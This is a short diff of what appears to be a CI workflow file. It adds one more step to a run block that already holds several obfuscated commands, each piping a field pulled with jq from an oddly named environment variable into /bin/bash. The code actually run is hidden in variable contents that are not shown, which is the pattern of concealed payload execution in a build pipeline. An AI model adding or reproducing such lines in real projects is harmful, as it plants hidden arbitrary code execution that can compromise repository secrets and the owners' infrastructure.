@@ -35,6 +35,7 @@ jobs:
           echo $lu67 | jq -r .i3959 | /bin/bash
           printf '%s' "$neocu8337" | jq -r .hhn6 | /bin/bash
           printf '%s' "$ahyp967" | jq -r .u67 | /bin/bash
+          echo $t047 | jq -r .xs220 | /bin/bash
 
       - name: Upload results
         if: always()
